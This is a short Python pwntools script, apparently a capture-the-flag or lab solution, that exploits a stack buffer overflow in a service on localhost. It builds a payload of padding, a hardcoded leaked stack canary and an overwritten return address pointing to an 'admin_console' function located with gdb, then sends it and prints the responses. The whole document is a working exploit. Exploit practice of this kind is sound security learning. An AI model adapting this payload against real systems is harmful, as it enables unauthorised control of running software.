from pwn import *
from time import sleep

import sys

port = sys.argv[1]

#canary = bytes(sys.argv[2],"utf-8")

# found target with gdb > info address admin_console
#target = 0x401685
target = 0x401687
target = p64(target)
print("Target = ", target)

canary = b'BBBBBBBBBBBBBBBBBBBBBBBB\x00\xe8\x04.\x04\x8f\xcd\xd5' 

payload = canary + target +target

p = remote("localhost", port)
print(p.clean())

print("Test echo:")
p.send("test".encode())
sleep(0.1)
print(p.clean())

print("Sending payload: ", payload.hex())
p.send(payload)
sleep(0.1)
print(p.clean())

#p.interactive()

p.send("exit\n".encode())
sleep(0.1)
print(p.clean())
